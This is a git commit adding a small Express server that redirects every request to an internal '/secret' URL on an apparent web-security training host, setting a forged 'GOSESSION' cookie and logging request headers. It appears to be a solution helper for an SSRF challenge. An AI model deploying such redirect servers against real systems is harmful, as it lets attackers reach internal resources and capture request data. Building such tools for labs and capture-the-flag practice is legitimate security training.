7863e7a1677b72cee1d1ba88e884832b45522770
romain lucas <44882510+roromainlcs@users.noreply.github.com>
2024-02-27 16:21:21 +0100

    redirect

---
+++ server.js
@@ -0,0 +1,18 @@
+const express = require('express');
+const app = express();
+const port = 80; // You can use any port that is free on your system
+
+// Redirect all requests to the specific URL
+app.get('*', (req, res) => {
+    //add cookie adn redirect
+    res.cookie('GOSESSION', 'guest-go1.11.5')
+    res.redirect('https://ssrf1.secu-web.blackfoot.dev/secret');
+    //res.status(200).send('Hello World');
+    console.log('Request received');
+    console.log(req.headers);
+});
+
+// Start the server
+app.listen(port, '0.0.0.0', () => {
+    console.log(`Server running on http://localhost:${port}`);
+});
